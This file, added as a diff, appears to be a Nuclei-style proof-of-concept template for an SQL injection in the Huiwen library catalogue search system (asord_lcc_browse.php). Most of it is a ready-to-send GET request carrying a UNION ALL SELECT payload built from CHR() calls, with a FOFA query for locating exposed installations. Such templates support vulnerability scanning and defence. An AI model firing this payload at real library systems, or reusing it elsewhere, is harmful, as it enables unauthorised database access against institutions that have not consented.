@@ -1,0 +1,33 @@
+id: poc-niewpfw0ggqwgbi4
+info:
+  name: 汇文软件-书目检索系统 asord_lcc_browse.php 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/niewpfw0ggqwgbi4'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: niewpfw0ggqwgbi4
+    fofa: app="汇文软件-书目检索系统"
+http:
+- raw:
+  - 'GET /asord/asord_lcc_browse.php?cls_no=A%''+UNION+ALL+SELECT+CHR(113)||CHR(107)||CHR(107)||CHR(112)||CHR(113)||CHR(87)||CHR(71)||CHR(77)||CHR(70)||CHR(73)||CHR(118)||CHR(75)||CHR(68)||CHR(86)||CHR(110)||CHR(85)||CHR(106)||CHR(102)||CHR(117)||CHR(66)||CHR(106)||CHR(102)||CHR(118)||CHR(104)||CHR(122)||CHR(86)||CHR(77)||CHR(68)||CHR(117)||CHR(73)||CHR(105)||CHR(84)||CHR(65)||CHR(101)||CHR(88)||CHR(113)||CHR(113)||CHR(114)||CHR(110)||CHR(66)||CHR(84)||CHR(71)||CHR(102)||CHR(116)||CHR(120)||CHR(113)||CHR(118)||CHR(112)||CHR(120)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--+A HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
